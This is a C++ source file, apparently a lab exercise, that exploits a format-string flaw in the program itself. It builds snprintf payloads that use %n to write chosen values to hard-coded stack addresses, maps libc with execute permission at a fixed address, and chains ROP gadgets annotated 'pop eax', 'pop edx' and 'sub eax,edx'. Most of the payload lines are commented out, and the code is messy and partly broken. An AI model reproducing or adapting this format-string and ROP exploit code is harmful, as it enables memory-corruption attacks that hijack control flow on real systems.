#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <unistd.h>
#include <algorithm>
#include <iostream>
#include <fstream>
#include <sysexits.h>
#include <err.h>
#include <sys/mman.h>
#include <vector>
#define LIB_FILE_READ 1713640

using namespace std;

string getAddress(string address) {
	int length = address.size();
	//cout<<length<<endl;
	int index = 0;
	length = length / 2 + 1;
	const char* tempAddress = address.c_str();
	//cout<<tempAddress<<endl;
	char * newChar = new char[length];
	int baseNumber;
	int number;
	for (int i = 0; i < length - 1; i++) {
		baseNumber = 0;
		number = 0;

		//cout<<tempAddress[6-(2*i)]<<endl;
		switch (tempAddress[6 - (2 * i)]) {
		case 'A':
			baseNumber = 10;
			break;
		case 'B':
			baseNumber = 11;
			break;
		case 'C':
			baseNumber = 12;
			break;
		case 'D':
			baseNumber = 13;
			break;
		case 'E':
			baseNumber = 14;
			break;
		case 'F':
			baseNumber = 15;
			break;
		default:
			baseNumber = tempAddress[6 - (2 * i)] - '0';
			break;
		}
		//cout<<baseNumber<<endl;
		number = number + baseNumber * 16;
		//cout<<tempAddress[7-(2*i)]<<endl;
		switch (tempAddress[7 - 2 * i]) {
		case 'A':
			baseNumber = 10;
			break;
		case 'B':
			baseNumber = 11;
			break;
		case 'C':
			baseNumber = 12;
			break;
		case 'D':
			baseNumber = 13;
			break;
		case 'E':
			baseNumber = 14;
			break;
		case 'F':
			baseNumber = 15;
			break;
		default:
			baseNumber = tempAddress[7 - (2 * i)] - '0';
			break;
		}
		//cout<<baseNumber<<endl;
		number = number + baseNumber;
		cout << number << endl;
		newChar[i] = number;
	}

	newChar[length - 1] = '\0';

	string address1 = newChar;

	//cout<<address1.size()<<endl;
	return address1;
}
string reverseString(string str) {
	int length = str.size();
	//cout<<length<<endl;
	int index = 0;
	length = length + 1;
	const char* tempStr = str.c_str();

	char * newChar = new char[length];

	for (int i = 0; i < length - 1; i++) {
		newChar[i] = tempStr[length - 2 - i];
	}
	newChar[length - 1] = '\0';

	string newStr = newChar;
	return newStr;
}
string getNumber(int number) {
	char * newchar = new char[32];
	char tempNumber = 0;
	int index = 0;
	while (number / 10 != 0) {
		tempNumber = '0' + number % 10;
		newchar[index] = tempNumber;
		index++;
		number = number / 10;
	}
	tempNumber = '0' + number % 10;
	newchar[index] = tempNumber;

	newchar[++index] = '\0';
	string tempStr = newchar;

	//return tempStr;
	return reverseString(tempStr);
}
char* DecToHex(long iDecVal, char* szHex) {
	//将十进制整数格式化为16进制，结果保存在字符串中
	sprintf(szHex, "%X", iDecVal);
	return szHex;
}

string getRealAddress(string address, long index) {
	int length = address.size();
	//cout<<length<<endl;

	length = length + 1;
	const char* tempStr = address.c_str();

	char * newChar = new char[length];
	unsigned long number = 0;
	int count = 7;
	int baseNumber = 0;

	//将16进制数转换为10进制数
	for (int i = 0; i < length - 1; i++) {
		switch (tempStr[i]) {
		case 'a':
			baseNumber = 10;
			break;
		case 'b':
			baseNumber = 11;
			break;
		case 'c':
			baseNumber = 12;
			break;
		case 'd':
			baseNumber = 13;
			break;
		case 'e':
			baseNumber = 14;
			break;
		case 'f':
			baseNumber = 15;
			break;
		default:
			baseNumber = tempStr[i] - '0';
			break;
		}
		int tempCount = count;

		while (tempCount > 0) {
			baseNumber = baseNumber * 16;
			tempCount--;
		}
		number = number + baseNumber;
		count--;
	}
	//两个10进制数相加

	number = number + index;

	//将10进制结果转为16进制
	newChar = DecToHex(number, newChar);

	newChar[length - 1] = '\0';

	//将16进制变换为程序需要的格式

	string address1 = newChar;
	return getAddress(address1);

}
string getBlank(int blank) {
	char *newChar = new char[blank * 2 - 1];
	int index = 0;
	while (blank > 1) {
		newChar[index++] = '%';
		newChar[index++] = 'd';
		blank = blank - 1;
	}
	newChar[index] = '\0';
	string resultStr = newChar;

	return resultStr;
}
string getStr(long index, int data, int blank) {
	//index表示偏离位置，data表示指令地址或者数据
	string address = "bffff25c";

	address = getRealAddress(address, index);

	string blankStr = getBlank(blank);
	string temp2 = "%.";
	int offset = -14;
	string number = getNumber(data - 3 - blank);

	string temp3 = "d%n";

	string resultStr = address + blankStr + temp2 + number + temp3;

	return resultStr.c_str();
}

int f(int a);
int main() {
	int fd;
	struct stat sb;
	char sourcepath[100] = "libc.so";
	if ((fd = open(sourcepath, O_RDWR)) < 0) {
		perror("open");
	}
	if ((fstat(fd, &sb)) == -1) {
		perror("fstat");
	}
	unsigned int heapaddr = (unsigned int) mmap((void*) 0x1656c000, sb.st_size,
			PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0);
	int rtn = 0;
	int a = 1;
	int b = 2;
	rtn = f(a);
	rtn = rtn + b;
	return 0;
}
int f(int a) {
	char buffer[100];
	int x = 20;
	/*
	 snprintf(b, sizeof(str), "\x00\xf1\xff\xbf%d%d%.252d%n");
	 snprintf(str, sizeof(str), "\x01\xf1\xff\xbf%d%d%.250d%n");
	 snprintf(str, sizeof(str), "\x02\xf1\xff\xbf%d%d%.250d%n");
	 snprintf(str, sizeof(str), "\x03\xf1\xff\xbf%d%d%.250d%n");
	 */
	//...; pop eax; ...
	int addr = 0;
	int b = 2;

	snprintf(buffer, sizeof(buffer), "\x00\xf1\xff\xbf%d%d%d%d%d%d%.20d%n");

//	const char* str = getStr(addr, 374981130, b).c_str();
//	snprintf(buffer, sizeof buffer, str);
//	addr += 4;
//	str = getStr(addr, 60, b).c_str(); //eax
//	snprintf(buffer, sizeof buffer, str);
//	addr += 4;
//	str = getStr(addr, 40, b).c_str();
//	snprintf(buffer, sizeof buffer, str);
//	addr += 4;
//	str = getStr(addr, 40, b).c_str();
//	snprintf(buffer, sizeof buffer, str);
//	addr += 4;
//	str = getStr(addr, 40, b).c_str();
//	snprintf(buffer, sizeof buffer, str);
//	addr += 4;
//	const char* str2 = getStr(addr, 375801713, b).c_str(); //pop edx;...
//	//str = getStr(addr,100,b).c_str();
//	snprintf(buffer, sizeof buffer, str2);
//	addr += 4;
//	str = getStr(addr, 50, b).c_str();
//	snprintf(buffer, sizeof buffer, str); //edx
//	addr += 4;
//	str = getStr(addr, 40, b).c_str();
//	snprintf(buffer, sizeof buffer, str);
//	addr += 4;
//	str = getStr(addr, 40, b).c_str();
//	snprintf(buffer, sizeof buffer, str);
//	addr += 4;
//	str = getStr(addr, 375801713, b).c_str();
//	snprintf(buffer, sizeof buffer, str);
//	str = getStr(addr, 375801713, 3).c_str();
//	snprintf(buffer, sizeof buffer, str);
//	str = getStr(addr, 375801713, 3).c_str();
//	snprintf(buffer, sizeof buffer, str);
//
////str = getStr(8,20,3).c_str();
//	//snprintf(buffer, sizeof buffer, str);
//	//str = getStr(12,20,3).c_str();
//	//snprintf(buffer, sizeof buffer, str);
//
//	snprintf(buffer, sizeof buffer, "\x60\xf2\xff\xbf%d%d%.25d%n"); //eax的值
//	snprintf(buffer, sizeof buffer, "\x64\xf2\xff\xbf%d%.25d%n");
//
//	snprintf(buffer, sizeof buffer, "\x68\xf2\xff\xbf%d%.126996d%n"); //bffff014
//	snprintf(buffer, sizeof buffer, "\x6a\xf2\xff\xbf%d%.49146d%n");
//	snprintf(buffer, sizeof buffer, "\x6c\xf2\xff\xbf%d%.127015d%n"); //bffff02c
//	snprintf(buffer, sizeof buffer, "\x6e\xf2\xff\xbf%d%.49146d%n");
//	//pop edx; ...
//	snprintf(buffer, sizeof buffer, "\x70\xf2\xff\xbf%d%.375801708d%n");
//	snprintf(buffer, sizeof buffer, "\x74\xf2\xff\xbf%d%.15d%n");
//	snprintf(buffer, sizeof buffer, "\x78\xf2\xff\xbf%d%.15d%n");
//	snprintf(buffer, sizeof buffer, "\x7c\xf2\xff\xbf%d%.15d%n");
//
//	//sub eax,edx; ...
//	snprintf(buffer, sizeof buffer, "\x80\xf2\xff\xbf%d%.375469700d%n");
//	//snprintf(buffer, sizeof buffer, "\x84\xf2\xff\xbf%d%.126996d%n");
//	//snprintf(buffer, sizeof buffer, "\x88\xf2\xff\xbf%d%.49146d%n");
//
//	//pop edi; ret
//
//	snprintf(buffer, sizeof buffer, "\xa0\xf2\xff\xbf%d%.374981128d%n");
//
//	snprintf(buffer, sizeof buffer, "\x88\xf2\xff\xbf%d%.49146d%n");
//
//	int k = a + x;
//	return k;
	return 0;
}

